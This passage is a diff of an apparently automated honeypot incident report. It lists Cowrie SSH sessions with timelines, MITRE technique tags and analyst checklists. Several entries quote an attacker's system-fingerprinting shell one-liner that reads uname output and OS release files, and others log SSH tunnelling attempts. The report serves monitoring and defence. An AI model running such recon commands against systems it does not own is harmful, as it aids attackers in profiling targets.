-| `2026-08-22 13:09:10` | `cowrie.session.closed` |
+| `2026-08-22 15:59:41` | `cowrie.session.connect` |
+| `2026-08-22 15:59:41` | `cowrie.client.version` |
+| `2026-08-22 15:59:41` | `cowrie.client.kex` |
+| `2026-08-22 15:59:42` | `cowrie.login.success` |
+| `2026-08-22 15:59:43` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:59:43` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:59:43` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:59:43` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
@@ -1035,13 +3282,13 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-cf4027aafcaf
+### 🔴 HIGH · IR-2072bd5d4431
 
 | Field | Detail |
 |---|---|
 | **Source IP** | `217.60.255[.]130` |
-| **First Seen** | 2026-08-22 13:09 |
-| **Last Seen** | 2026-08-22 13:09 |
+| **First Seen** | 2026-08-22 15:59 |
+| **Last Seen** | 2026-08-22 15:59 |
 | **Session Duration** | 1s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -1052,14 +3299,14 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:09:12` | `cowrie.session.connect` |
-| `2026-08-22 13:09:12` | `cowrie.client.version` |
-| `2026-08-22 13:09:12` | `cowrie.client.kex` |
-| `2026-08-22 13:09:13` | `cowrie.login.success` |
-| `2026-08-22 13:09:13` | `cowrie.direct-tcpip.request` |
-| `2026-08-22 13:09:13` | `cowrie.direct-tcpip.ja4h` |
-| `2026-08-22 13:09:13` | `cowrie.direct-tcpip.data` |
-| `2026-08-22 13:09:13` | `cowrie.session.closed` |
+| `2026-08-22 15:59:46` | `cowrie.session.connect` |
+| `2026-08-22 15:59:46` | `cowrie.client.version` |
+| `2026-08-22 15:59:46` | `cowrie.client.kex` |
+| `2026-08-22 15:59:47` | `cowrie.login.success` |
+| `2026-08-22 15:59:47` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 15:59:47` | `cowrie.direct-tcpip.ja4h` |
+| `2026-08-22 15:59:47` | `cowrie.direct-tcpip.data` |
+| `2026-08-22 15:59:47` | `cowrie.session.closed` |
 
 **Recommended Actions:**
 - [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
@@ -1068,54 +3315,13 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 - [ ] Confirm tunnel target is not internal infrastructure
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-3260827e048f
+### 🔴 HIGH · IR-798195bf532f
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:09 |
-| **Last Seen** | 2026-08-22 13:09 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-08-22 13:09:34` | `cowrie.session.connect` |
-| `2026-08-22 13:09:34` | `cowrie.client.version` |
-| `2026-08-22 13:09:34` | `cowrie.client.kex` |
-| `2026-08-22 13:09:34` | `cowrie.login.success` |
-| `2026-08-22 13:09:35` | `cowrie.session.params` |
-| `2026-08-22 13:09:35` | `cowrie.command.input` |
-| `2026-08-22 13:09:35` | `cowrie.command.input` |
-| `2026-08-22 13:09:35` | `cowrie.command.input` |
-| `2026-08-22 13:09:35` | `cowrie.command.input` |
-| `2026-08-22 13:09:35` | `cowrie.command.input` |
-| `2026-08-22 13:09:35` | `cowrie.command.success` |
-| `2026-08-22 13:09:35` | `cowrie.command.input` |
-| `2026-08-22 13:09:35` | `cowrie.command.input` |
-| `2026-08-22 13:09:35` | `cowrie.command.input` |
-| `2026-08-22 13:09:35` | `cowrie.command.input` |
-| `2026-08-22 13:09:35` | `cowrie.log.closed` |
-| `2026-08-22 13:09:36` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-8085fb16cdd2
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:11 |
-| **Last Seen** | 2026-08-22 13:11 |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:00 |
+| **Last Seen** | 2026-08-22 16:00 |
 | **Session Duration** | 2s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -1126,37 +3332,325 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:11:33` | `cowrie.session.connect` |
-| `2026-08-22 13:11:33` | `cowrie.client.version` |
-| `2026-08-22 13:11:33` | `cowrie.client.kex` |
-| `2026-08-22 13:11:34` | `cowrie.login.success` |
-| `2026-08-22 13:11:35` | `cowrie.session.params` |
-| `2026-08-22 13:11:35` | `cowrie.command.input` |
-| `2026-08-22 13:11:35` | `cowrie.command.input` |
-| `2026-08-22 13:11:35` | `cowrie.command.input` |
-| `2026-08-22 13:11:35` | `cowrie.command.input` |
-| `2026-08-22 13:11:35` | `cowrie.command.input` |
-| `2026-08-22 13:11:35` | `cowrie.command.success` |
-| `2026-08-22 13:11:35` | `cowrie.command.input` |
-| `2026-08-22 13:11:35` | `cowrie.command.input` |
-| `2026-08-22 13:11:35` | `cowrie.command.input` |
-| `2026-08-22 13:11:35` | `cowrie.command.input` |
-| `2026-08-22 13:11:35` | `cowrie.log.closed` |
-| `2026-08-22 13:11:35` | `cowrie.session.closed` |
+| `2026-08-22 16:00:52` | `cowrie.session.connect` |
+| `2026-08-22 16:00:52` | `cowrie.client.version` |
+| `2026-08-22 16:00:52` | `cowrie.client.kex` |
+| `2026-08-22 16:00:53` | `cowrie.login.success` |
+| `2026-08-22 16:00:54` | `cowrie.session.params` |
+| `2026-08-22 16:00:54` | `cowrie.command.input` |
+| `2026-08-22 16:00:54` | `cowrie.command.input` |
+| `2026-08-22 16:00:54` | `cowrie.command.input` |
+| `2026-08-22 16:00:54` | `cowrie.command.input` |
+| `2026-08-22 16:00:54` | `cowrie.command.input` |
+| `2026-08-22 16:00:54` | `cowrie.command.success` |
+| `2026-08-22 16:00:54` | `cowrie.command.input` |
+| `2026-08-22 16:00:54` | `cowrie.command.input` |
+| `2026-08-22 16:00:54` | `cowrie.command.input` |
+| `2026-08-22 16:00:54` | `cowrie.command.input` |
+| `2026-08-22 16:00:54` | `cowrie.log.closed` |
+| `2026-08-22 16:00:54` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-980968362128
+### 🔴 HIGH · IR-e81f2574826e
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:13 |
-| **Last Seen** | 2026-08-22 13:13 |
+| **Source IP** | `72.24.210[.]58` |
+| **First Seen** | 2026-08-22 16:02 |
+| **Last Seen** | 2026-08-22 16:02 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:02:14` | `cowrie.session.connect` |
+| `2026-08-22 16:02:14` | `cowrie.client.version` |
+| `2026-08-22 16:02:14` | `cowrie.client.kex` |
+| `2026-08-22 16:02:15` | `cowrie.login.success` |
+| `2026-08-22 16:02:15` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:02:20` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `72.24.210[.]58` to AbuseIPDB if not already reported
+- [ ] Block `72.24.210[.]58` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-b1383d50c7b2
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `138.84.59[.]192` |
+| **First Seen** | 2026-08-22 16:02 |
+| **Last Seen** | 2026-08-22 16:07 |
+| **Session Duration** | 302s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:02:21` | `cowrie.session.connect` |
+| `2026-08-22 16:02:22` | `cowrie.client.version` |
+| `2026-08-22 16:02:22` | `cowrie.client.kex` |
+| `2026-08-22 16:02:24` | `cowrie.login.success` |
+| `2026-08-22 16:02:24` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:07:24` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `138.84.59[.]192` to AbuseIPDB if not already reported
+- [ ] Block `138.84.59[.]192` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-2d480af08816
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:02 |
+| **Last Seen** | 2026-08-22 16:02 |
+| **Session Duration** | 1s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:02:29` | `cowrie.session.connect` |
+| `2026-08-22 16:02:29` | `cowrie.client.version` |
+| `2026-08-22 16:02:29` | `cowrie.client.kex` |
+| `2026-08-22 16:02:30` | `cowrie.login.success` |
+| `2026-08-22 16:02:31` | `cowrie.session.params` |
+| `2026-08-22 16:02:31` | `cowrie.command.input` |
+| `2026-08-22 16:02:31` | `cowrie.command.input` |
+| `2026-08-22 16:02:31` | `cowrie.command.input` |
+| `2026-08-22 16:02:31` | `cowrie.command.input` |
+| `2026-08-22 16:02:31` | `cowrie.command.input` |
+| `2026-08-22 16:02:31` | `cowrie.command.success` |
+| `2026-08-22 16:02:31` | `cowrie.command.input` |
+| `2026-08-22 16:02:31` | `cowrie.command.input` |
+| `2026-08-22 16:02:31` | `cowrie.command.input` |
+| `2026-08-22 16:02:31` | `cowrie.command.input` |
+| `2026-08-22 16:02:31` | `cowrie.log.closed` |
+| `2026-08-22 16:02:31` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-5dbd2a6adae4
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:04 |
+| **Last Seen** | 2026-08-22 16:04 |
+| **Session Duration** | 2s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:04:12` | `cowrie.session.connect` |
+| `2026-08-22 16:04:13` | `cowrie.client.version` |
+| `2026-08-22 16:04:13` | `cowrie.client.kex` |
+| `2026-08-22 16:04:13` | `cowrie.login.success` |
+| `2026-08-22 16:04:14` | `cowrie.session.params` |
+| `2026-08-22 16:04:14` | `cowrie.command.input` |
+| `2026-08-22 16:04:14` | `cowrie.command.input` |
+| `2026-08-22 16:04:14` | `cowrie.command.input` |
+| `2026-08-22 16:04:14` | `cowrie.command.input` |
+| `2026-08-22 16:04:14` | `cowrie.command.input` |
+| `2026-08-22 16:04:14` | `cowrie.command.success` |
+| `2026-08-22 16:04:14` | `cowrie.command.input` |
+| `2026-08-22 16:04:14` | `cowrie.command.input` |
+| `2026-08-22 16:04:14` | `cowrie.command.input` |
+| `2026-08-22 16:04:14` | `cowrie.command.input` |
+| `2026-08-22 16:04:15` | `cowrie.log.closed` |
+| `2026-08-22 16:04:15` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-860fe6272d58
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:05 |
+| **Last Seen** | 2026-08-22 16:05 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:05:34` | `cowrie.session.connect` |
+| `2026-08-22 16:05:34` | `cowrie.client.version` |
+| `2026-08-22 16:05:34` | `cowrie.client.kex` |
+| `2026-08-22 16:05:35` | `cowrie.login.success` |
+| `2026-08-22 16:05:37` | `cowrie.session.params` |
+| `2026-08-22 16:05:37` | `cowrie.command.input` |
+| `2026-08-22 16:05:37` | `cowrie.command.input` |
+| `2026-08-22 16:05:37` | `cowrie.command.input` |
+| `2026-08-22 16:05:37` | `cowrie.command.input` |
+| `2026-08-22 16:05:37` | `cowrie.command.input` |
+| `2026-08-22 16:05:37` | `cowrie.command.success` |
+| `2026-08-22 16:05:37` | `cowrie.command.input` |
+| `2026-08-22 16:05:37` | `cowrie.command.input` |
+| `2026-08-22 16:05:37` | `cowrie.command.input` |
+| `2026-08-22 16:05:37` | `cowrie.command.input` |
+| `2026-08-22 16:05:38` | `cowrie.log.closed` |
+| `2026-08-22 16:05:38` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-5bbaa79e33dd
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:06 |
+| **Last Seen** | 2026-08-22 16:06 |
+| **Session Duration** | 4s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:06:49` | `cowrie.session.connect` |
+| `2026-08-22 16:06:49` | `cowrie.client.version` |
+| `2026-08-22 16:06:49` | `cowrie.client.kex` |
+| `2026-08-22 16:06:51` | `cowrie.login.success` |
+| `2026-08-22 16:06:52` | `cowrie.session.params` |
+| `2026-08-22 16:06:52` | `cowrie.command.input` |
+| `2026-08-22 16:06:52` | `cowrie.command.input` |
+| `2026-08-22 16:06:52` | `cowrie.command.input` |
+| `2026-08-22 16:06:53` | `cowrie.command.input` |
+| `2026-08-22 16:06:53` | `cowrie.command.input` |
+| `2026-08-22 16:06:53` | `cowrie.command.success` |
+| `2026-08-22 16:06:53` | `cowrie.command.input` |
+| `2026-08-22 16:06:53` | `cowrie.command.input` |
+| `2026-08-22 16:06:53` | `cowrie.command.input` |
+| `2026-08-22 16:06:53` | `cowrie.command.input` |
+| `2026-08-22 16:06:53` | `cowrie.log.closed` |
+| `2026-08-22 16:06:54` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-fc5bf5814a74
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `189.52.52[.]162` |
+| **First Seen** | 2026-08-22 16:07 |
+| **Last Seen** | 2026-08-22 16:07 |
+| **Session Duration** | 8s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:07:09` | `cowrie.session.connect` |
+| `2026-08-22 16:07:10` | `cowrie.client.version` |
+| `2026-08-22 16:07:10` | `cowrie.client.kex` |
+| `2026-08-22 16:07:12` | `cowrie.login.success` |
+| `2026-08-22 16:07:13` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:07:17` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
+- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-475d7c96c212
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `64.33.178[.]57` |
+| **First Seen** | 2026-08-22 16:07 |
+| **Last Seen** | 2026-08-22 16:07 |
+| **Session Duration** | 6s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
+| **TTPs (MITRE)** | T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-08-22 16:07:18` | `cowrie.session.connect` |
+| `2026-08-22 16:07:18` | `cowrie.client.version` |
+| `2026-08-22 16:07:18` | `cowrie.client.kex` |
+| `2026-08-22 16:07:20` | `cowrie.login.success` |
+| `2026-08-22 16:07:20` | `cowrie.direct-tcpip.request` |
+| `2026-08-22 16:07:24` | `cowrie.session.closed` |
+
+**Recommended Actions:**
+- [ ] Submit `64.33.178[.]57` to AbuseIPDB if not already reported
+- [ ] Block `64.33.178[.]57` at perimeter firewall / security group
+- [ ] Investigate TCP tunnel target — port forwarding via honeypot
+- [ ] Confirm tunnel target is not internal infrastructure
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-23fdac59aad0
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:08 |
+| **Last Seen** | 2026-08-22 16:08 |
 | **Session Duration** | 3s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
@@ -1167,38 +3661,38 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:13:08` | `cowrie.session.connect` |
-| `2026-08-22 13:13:08` | `cowrie.client.version` |
-| `2026-08-22 13:13:08` | `cowrie.client.kex` |
-| `2026-08-22 13:13:10` | `cowrie.login.success` |
-| `2026-08-22 13:13:11` | `cowrie.session.params` |
-| `2026-08-22 13:13:11` | `cowrie.command.input` |
-| `2026-08-22 13:13:11` | `cowrie.command.input` |
-| `2026-08-22 13:13:11` | `cowrie.command.input` |
-| `2026-08-22 13:13:11` | `cowrie.command.input` |
-| `2026-08-22 13:13:11` | `cowrie.command.input` |
-| `2026-08-22 13:13:11` | `cowrie.command.success` |
-| `2026-08-22 13:13:11` | `cowrie.command.input` |
-| `2026-08-22 13:13:11` | `cowrie.command.input` |
-| `2026-08-22 13:13:11` | `cowrie.command.input` |
-| `2026-08-22 13:13:11` | `cowrie.command.input` |
-| `2026-08-22 13:13:11` | `cowrie.log.closed` |
-| `2026-08-22 13:13:12` | `cowrie.session.closed` |
+| `2026-08-22 16:08:01` | `cowrie.session.connect` |
+| `2026-08-22 16:08:02` | `cowrie.client.version` |
+| `2026-08-22 16:08:02` | `cowrie.client.kex` |
+| `2026-08-22 16:08:03` | `cowrie.login.success` |
+| `2026-08-22 16:08:05` | `cowrie.session.params` |
+| `2026-08-22 16:08:05` | `cowrie.command.input` |
+| `2026-08-22 16:08:05` | `cowrie.command.input` |
+| `2026-08-22 16:08:05` | `cowrie.command.input` |
+| `2026-08-22 16:08:05` | `cowrie.command.input` |
+| `2026-08-22 16:08:05` | `cowrie.command.input` |
+| `2026-08-22 16:08:05` | `cowrie.command.success` |
+| `2026-08-22 16:08:05` | `cowrie.command.input` |
+| `2026-08-22 16:08:05` | `cowrie.command.input` |
+| `2026-08-22 16:08:05` | `cowrie.command.input` |
+| `2026-08-22 16:08:05` | `cowrie.command.input` |
+| `2026-08-22 16:08:05` | `cowrie.log.closed` |
+| `2026-08-22 16:08:05` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
-- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
+- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
+- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-ecfb537a158a
+### 🔴 HIGH · IR-1c479b303685
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `195.178.110[.]228` |
-| **First Seen** | 2026-08-22 13:14 |
-| **Last Seen** | 2026-08-22 13:14 |
-| **Session Duration** | 2s |
+| **Source IP** | `195.178.110[.]232` |
+| **First Seen** | 2026-08-22 16:09 |
+| **Last Seen** | 2026-08-22 16:09 |
+| **Session Duration** | 3s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
 | **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
@@ -1208,243 +3702,37 @@ Source IPs: `182.118.64.225`, `196.196.150.99`, `43.165.178.246`, `103.193.179.1
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-08-22 13:14:40` | `cowrie.session.connect` |
-| `2026-08-22 13:14:40` | `cowrie.client.version` |
-| `2026-08-22 13:14:40` | `cowrie.client.kex` |
-| `2026-08-22 13:14:41` | `cowrie.login.success` |
-| `2026-08-22 13:14:42` | `cowrie.session.params` |
-| `2026-08-22 13:14:42` | `cowrie.command.input` |
-| `2026-08-22 13:14:42` | `cowrie.command.input` |
-| `2026-08-22 13:14:42` | `cowrie.command.input` |
-| `2026-08-22 13:14:42` | `cowrie.command.input` |
-| `2026-08-22 13:14:42` | `cowrie.command.input` |
-| `2026-08-22 13:14:42` | `cowrie.command.success` |
-| `2026-08-22 13:14:42` | `cowrie.command.input` |
-| `2026-08-22 13:14:42` | `cowrie.command.input` |
-| `2026-08-22 13:14:42` | `cowrie.command.input` |
-| `2026-08-22 13:14:42` | `cowrie.command.input` |
-| `2026-08-22 13:14:42` | `cowrie.log.closed` |
-| `2026-08-22 13:14:43` | `cowrie.session.closed` |
+| `2026-08-22 16:09:15` | `cowrie.session.connect` |
+| `2026-08-22 16:09:16` | `cowrie.client.version` |
+| `2026-08-22 16:09:16` | `cowrie.client.kex` |
+| `2026-08-22 16:09:17` | `cowrie.login.success` |
+| `2026-08-22 16:09:18` | `cowrie.session.params` |
+| `2026-08-22 16:09:18` | `cowrie.command.input` |
+| `2026-08-22 16:09:18` | `cowrie.command.input` |
+| `2026-08-22 16:09:18` | `cowrie.command.input` |
+| `2026-08-22 16:09:18` | `cowrie.command.input` |
+| `2026-08-22 16:09:18` | `cowrie.command.input` |
